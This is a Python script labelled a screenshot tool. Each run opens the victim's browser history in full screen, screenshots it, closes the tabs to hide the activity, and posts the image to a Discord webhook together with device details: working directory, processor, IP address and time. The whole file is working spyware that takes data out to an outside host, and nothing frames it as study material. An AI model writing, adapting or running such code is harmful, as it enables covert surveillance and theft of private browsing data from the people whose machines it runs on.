try:
    import pyscreenshot as ImageGrab
    import time
    import io
    import requests
    import webbrowser
    import os
    import platform
    import keyboard
    import socket
    from datetime import datetime
#since there are a ton of impors, we want to be as coherent as possible if an import is not installed.
except ImportError as exception:
    missing_packages = [pkg for pkg in str(exception).split() if "'" in pkg]
    for package in missing_packages:
        print(f"The {package} package is not installed. Please install it to use this screenshot tool:\n" + " pip install " + package)
        quit()

#discord webhook goes here
DISCORD_WEBHOOK_URL = "input discord webhook here"
#to get discord webhook url, go to server settings --> integrations --> webhooks --> webhook name --> Copy Webhook Url

starting_time = time.time()

#however many times (screenshots) you want is the array length
array = [1, 2]
count = 0


#change this if you want a different website
website = 'https://www.ipchicken.com/'
google = 'https://google.com'

def send_message(message_content):
    payload = {
        "content": message_content
    }
    
    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
    print("Message Sent:\n|\n|\n" + str(response.text))

def take_image():
    webbrowser.open_new_tab(google)
    time.sleep(0.7)
    keyboard.press_and_release('ctrl+h')
    time.sleep(0.3)
    keyboard.press_and_release('f11')
    time.sleep(1.0)
    image = ImageGrab.grab()
    now = datetime.now()
    #keybinds
    keyboard.press_and_release('f11')
    time.sleep(0.1)
    #closes tab
    keyboard.press_and_release('ctrl+w')
    time.sleep(0.2)
    keyboard.press_and_release('ctrl+w')
    time.sleep(0.2)
    keyboard.press_and_release('alt+tab')

    #uses byte stream to save and send image to discord
    image_stream = io.BytesIO()
    image.save(image_stream, format="PNG")
    image_stream.seek(0)
    
    #discord payload
    payload = {
        "content": "Screenshot taken:"
    }

    payload["file"] = ("screenshot.png", image_stream)

    #sends the payload to the webhook for the screenshot to be sent
    if DISCORD_WEBHOOK_URL.startswith("https://discord.com/api/webhooks"):
        response = requests.post(DISCORD_WEBHOOK_URL, files=payload)
        print("Screenshot Sent:\n|\n|\n" + str(response.text))
    else:
        #if url is invalid, runtime should be about 
        print("Discord Webhook Url is Invalid, please provide a valid one :) ")
        print("Program Quit")

        #calculate th3 runtime
        global end_time, runtime
        end_time = time.time()
        runtime = end_time - starting_time
        runtime = int(round(runtime))

        print("Total runtime: About " + str(runtime) + " seconds")
        quit()

    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    #gives stats about devicee
    send_message("**Device Data**: \n\n" + "Current Directory: " + os.getcwd() + "\nProcessor: " + platform.processor() + "\nIP Address: " + ip_address + "\nTime and Date: " + str(now))

def main(array):
    global count
    time.sleep(6)
    for num in array:
        take_image()
        print(f"Number of images taken: {num}")
        count += 1

        if len(array) <= count:

            global end_time, runtime
            end_time = time.time()
            runtime = end_time - starting_time
            runtime = int(round(runtime))

            print("Total runtime: About " + str(runtime) + " seconds")
            print("Program Quit")
            quit()
        else:
            print("Continuing...")
    return num

if __name__ == "__main__":
    main(array)
